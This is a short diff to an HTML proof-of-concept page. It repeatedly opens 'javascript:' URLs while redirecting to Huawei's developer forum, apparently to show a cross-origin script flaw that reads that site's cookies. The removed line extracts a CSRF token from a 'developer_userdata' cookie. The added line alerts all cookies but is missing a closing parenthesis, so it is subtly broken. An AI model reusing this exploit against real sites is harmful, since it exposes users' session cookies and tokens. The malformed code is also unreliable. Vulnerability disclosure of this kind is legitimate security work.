@@ -1,7 +1,7 @@
 <html>
   <script>
     window.noalert = true;
-    setInterval(() => { window.open("javascript:if(!window.noalert){let cookies = document.cookie.split('; ');let dev_userdata = cookies.find(cookie => cookie.startsWith('developer_userdata='));let token = JSON.parse(decodeURIComponent(dev_userdata.split('=')[1])).csrftoken;alert(token);}") }, 1);
+    setInterval(() => { window.open("javascript:if(!window.noalert){alert(document.cookie}") }, 1);
     location.href="https://developer.huawei.com/consumer/cn/forum/";
   </script>
 </html>
